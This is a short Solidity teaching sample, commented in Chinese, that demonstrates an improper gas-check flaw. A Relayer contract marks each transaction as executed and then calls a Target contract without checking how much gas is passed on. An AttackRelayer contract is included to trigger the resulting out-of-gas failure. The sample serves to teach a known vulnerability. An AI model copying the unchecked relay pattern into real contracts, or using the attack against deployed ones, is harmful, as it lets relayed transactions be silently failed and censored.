/*
漏洞名稱: Improper Gas Requirements Checking
描述: 此漏洞代表在執行某些操作時，缺少或錯誤地檢查必備的 gas 資源，可能導致額外、不必要的處理及記憶體資源使用，最終可能因 out-of-gas 而導致合約行為異常。

以下程式碼包含原始漏洞程式碼以及一個利用該漏洞的攻擊範例，
其中重點部分均以註解標示。
*/

// Vulnerable Relayer 合約
contract Relayer {
    uint public transactionId; // 漏洞重點: transactionId 未設定適當 gas 控制
    
    struct Tx {
        bytes data;
        bool executed;
    }
    
    mapping (uint => Tx) public transactions;
    
    // 漏洞函式: relay 未檢查傳遞到 Target 合約執行函式時的 gas 限制
    function relay(Target target, bytes memory _data) public returns (bool) {
        // Replay protection; 防止同一筆交易重複執行
        require(transactions[transactionId].executed == false, "same transaction twice");
        transactions[transactionId].data = _data;
        transactions[transactionId].executed = true;
        transactionId += 1;
        
        // 漏洞重點: 呼叫 Target.execute 時，沒有檢查或限制所提供的 gas，可能導致內部操作發生 out-of-gas
        (bool success, ) = address(target).call(abi.encodeWithSignature("execute(bytes)", _data));
        return success;
    }
}

// Vulnerable Target 合約
contract Target {
    // 漏洞函式: execute 未檢查足夠的 gas 是否可用，內部大量運算可能在某些情境下造成 out-of-gas
    function execute(bytes memory _data) public {
        // 模擬執行需要消耗大量 gas 的操作
        uint sum = 0;
        // 此迴圈故意消耗大量 gas，作為演示
        for (uint i = 0; i < 100000; i++) {
            sum += i;
        }
    }
}

// 攻擊合約: AttackRelayer
// 本合約利用 Relayer.call() 未傳遞適當 gas 限制，導致 Target.execute 內部運算消耗超過可用 gas，從而觸發 out-of-gas 異常。
contract AttackRelayer {
    Relayer public relayer;
    Target public target;

    // 部署前先部署 Relayer 與 Target 合約，並於此設定
    constructor(Relayer _relayer, Target _target) {
        relayer = _relayer;
        target = _target;
    }
    
    // 攻擊方法: 呼叫 relay 時傳入特定的資料讓 Target.execute 執行大量消耗 gas 的迴圈，進而造成 out-of-gas 問題
    function attack(bytes memory attackData) public {
        // 此處利用漏洞：因為 relay 中沒有檢查傳遞到 Target.execute 的 gas 限制，目標合約可能因運算過多導致執行失敗
        relayer.relay(target, attackData);
    }
}
